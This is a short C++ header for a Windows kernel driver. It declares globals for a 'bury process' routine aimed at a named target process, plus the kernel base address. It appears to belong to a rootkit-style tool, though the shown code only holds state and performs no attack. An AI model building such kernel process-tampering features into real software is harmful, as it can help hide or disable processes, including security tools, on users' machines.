#pragma once

#include <ntifs.h>
#include <wdf.h>
#include "WinTypes.hpp"

typedef struct _GLOBALS_BURYPROCESS {
    BOOLEAN buryRoutineAdded;
    WCHAR* beBuryTargetProcessName;
} GLOBALS_BURYPROCESS;

namespace BeGlobals
{
    GLOBALS_BURYPROCESS buryProcess = {
        FALSE,
        NULL
    };

    PVOID NtOsKrnlAddr;

    VOID
    BeInitGlobals(PDRIVER_OBJECT DriverObject)
    {
        NtOsKrnlAddr = BeGetKernelBaseAddr(DriverObject);
    }

}

